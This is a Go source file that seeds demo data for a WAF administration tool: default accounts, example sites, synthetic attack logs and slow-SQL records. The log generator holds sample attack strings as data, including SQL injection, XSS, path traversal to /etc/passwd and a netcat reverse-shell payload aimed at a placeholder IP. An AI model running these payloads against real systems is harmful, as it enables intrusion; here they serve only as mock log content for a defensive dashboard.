package memory

import (
	"fmt"
	"time"

	"wafadmin/internal/model"
	"wafadmin/pkg/crypto"
)

// lcg 是确定性的线性同余伪随机数发生器，保证演示数据每次一致、可复现。
type lcg struct {
	state uint64
}

// next 返回下一个随机数。
func (g *lcg) next() uint64 {
	g.state = g.state*6364136223846793005 + 1442695040888963407
	return g.state >> 33
}

// intn 返回 [0, n) 区间的随机整数。
func (g *lcg) intn(n int) int {
	if n <= 0 {
		return 0
	}
	return int(g.next() % uint64(n))
}

// pick 从候选集中随机取一项。
func (g *lcg) pick(items []string) string {
	if len(items) == 0 {
		return ""
	}
	return items[g.intn(len(items))]
}

// seedDemo 写入演示数据：账号、站点、内置规则、攻击日志与慢 SQL。
func (s *Store) seedDemo() {
	now := s.clock()
	hasher := crypto.Hasher{}

	for index, account := range []struct{ name, pass string }{
		{"admin", "admin"},
		{"operator", "operator"},
	} {
		s.userSeq++
		s.users = append(s.users, model.User{
			Id:        s.userSeq,
			UserName:  account.name,
			Password:  hasher.Password(account.pass),
			Created:   now.AddDate(0, 0, -30+index),
			LastLogin: now.Add(-time.Duration(index) * 3 * time.Hour),
		})
	}

	sites := []model.Site{
		{SiteName: "www.example.com", Port: 80, BackendAddr: []string{"10.0.0.11:8080", "10.0.0.12:8080"}, UnrealAddr: []string{"1.1.1.1"}, Ssl: "off", DebugLevel: "error"},
		{SiteName: "api.example.com", Port: 443, BackendAddr: []string{"10.0.1.21:9000"}, UnrealAddr: nil, Ssl: "on", DebugLevel: "warn"},
		{SiteName: "static.example.com", Port: 80, BackendAddr: []string{"10.0.0.31:80"}, UnrealAddr: nil, Ssl: "off", DebugLevel: "info"},
	}
	for index, site := range sites {
		s.siteSeq++
		site.Id = s.siteSeq
		site.Version = 1
		site.LastChange = now.AddDate(0, 0, -7+index)
		s.sites = append(s.sites, site)
	}

	for _, rule := range model.DefaultRules {
		s.rules = append(s.rules, rule)
		if rule.Id > s.ruleSeq {
			s.ruleSeq = rule.Id
		}
	}

	s.seedLogs(now)
	s.seedSlowSQL(now)
}

// seedLogs 生成最近 15 天的 WAF 攻击日志。
func (s *Store) seedLogs(now time.Time) {
	rng := &lcg{state: 20240415}

	sites := []string{"www.example.com", "api.example.com", "static.example.com"}
	ips := []string{"45.83.12.7", "103.21.244.9", "118.25.6.78", "185.220.101.5", "221.229.166.13", "92.63.197.44", "61.177.172.31", "146.190.78.22"}
	areas := []string{"中国-广东-深圳", "中国-北京", "中国-浙江-杭州", "中国-江苏-南京", "美国-弗吉尼亚", "荷兰-阿姆斯特丹", "中国-香港"}
	attacks := []string{"SQL注入", "XSS跨站", "路径穿越", "命令执行", "恶意扫描", "CC攻击", "文件包含", "恶意User-Agent"}
	urls := []string{
		"/index.php?id=1%27%20union%20select%201,2,3--",
		"/api/v1/user?file=../../../../etc/passwd",
		"/wp-login.php",
		"/.env",
		"/phpmyadmin/index.php",
		"/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
		"/comment?body=%3Ciframe%20src=x%3E",
		"/admin/config?cmd=cat%20/etc/shadow",
		"/download?name=..%2F..%2F..%2Fwindows%2Fwin.ini",
		"/login?next=javascript:alert(1)",
	}
	agents := []string{
		"sqlmap/1.7.2#stable (https://sqlmap.org)",
		"Nikto/2.5.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
		"python-requests/2.31.0",
		"curl/8.4.0",
		"Mozilla/5.0 (compatible; Nmap Scripting Engine)",
	}
	tags := []string{"args->sql_inject", "cookie->xss", "url->traversal", "post->rce", "useragent->scanner", "args->cc"}
	payloads := []string{
		"id=1' AND 1=1 --",
		"file=../../etc/passwd",
		"username=admin' OR '1'='1",
		"cmd=; nc -e /bin/sh 1.2.3.4 4444",
		"",
	}

	sequence := int64(0)
	for offset := 14; offset >= 0; offset-- {
		day := now.AddDate(0, 0, -offset)
		count := 8 + rng.intn(16)
		if offset < 3 {
			count += 10
		}
		for index := 0; index < count; index++ {
			sequence++
			attack := rng.pick(attacks)
			s.logs = append(s.logs, model.WafLog{
				Id:         sequence,
				ClientIp:   rng.pick(ips),
				LocalTime:  fmt.Sprintf("%s %02d:%02d:%02d", day.Format("2006-01-02"), rng.intn(24), rng.intn(60), rng.intn(60)),
				ServerName: rng.pick(sites),
				UserAgent:  rng.pick(agents),
				AttackType: attack,
				ReqUrl:     rng.pick(urls),
				Area:       rng.pick(areas),
				ReqData:    rng.pick(payloads),
				RuleTag:    rng.pick(tags),
			})
		}
	}
	s.logSeq = sequence
}

// seedSlowSQL 生成最近 7 天的慢 SQL 记录。
func (s *Store) seedSlowSQL(now time.Time) {
	rng := &lcg{state: 20250520}

	statements := []struct {
		op  string
		sql string
	}{
		{"select", "SELECT * FROM waf_log WHERE client_ip = ? AND local_time >= ? ORDER BY id DESC LIMIT 200"},
		{"select", "SELECT attack_type, COUNT(*) AS num, group_concat(DISTINCT area) AS area FROM waf_log WHERE to_days(local_time) = to_days(now()) GROUP BY attack_type"},
		{"select", "SELECT client_ip, area, COUNT(*) AS num FROM waf_log GROUP BY client_ip ORDER BY num DESC LIMIT 100"},
		{"select", "SELECT substring_index(local_time, ' ', 1) AS date, COUNT(*) AS num FROM waf_log GROUP BY date ORDER BY date DESC LIMIT 15"},
		{"select", "SELECT * FROM slow_sql WHERE occurred_at BETWEEN ? AND ? ORDER BY duration_ms DESC LIMIT 20"},
		{"update", "UPDATE site SET site_name = ?, backend_addr = ?, version = version + 1 WHERE id = ?"},
		{"select", "SELECT * FROM rules WHERE rule_type = ? ORDER BY id"},
		{"insert", "INSERT INTO waf_log (client_ip, local_time, server_name, attack_type, req_url) VALUES (?, ?, ?, ?, ?)"},
	}
	databases := []string{"waf", "waf_audit"}
	sources := []string{model.SlowSQLSourceAdmin, model.SlowSQLSourceAgent}

	sequence := int64(0)
	for index := 0; index < 86; index++ {
		sequence++
		item := statements[rng.intn(len(statements))]
		minutesAgo := rng.intn(7 * 24 * 60)
		item2 := model.SlowSQL{
			Id:         sequence,
			OccurredAt: now.Add(-time.Duration(minutesAgo) * time.Minute),
			Source:     rng.pick(sources),
			Database:   rng.pick(databases),
			Operation:  item.op,
			Statement:  item.sql,
			DurationMs: int64(210 + rng.intn(4800)),
			Rows:       int64(rng.intn(200000)),
			ClientIp:   "",
			TraceId:    fmt.Sprintf("trace-%06d", sequence),
		}
		if item2.Source == model.SlowSQLSourceAgent {
			item2.ClientIp = "10.0.0.1" + fmt.Sprintf("%d", rng.intn(9))
		}
		s.slows = append(s.slows, item2)
	}
	s.slowSeq = sequence
}
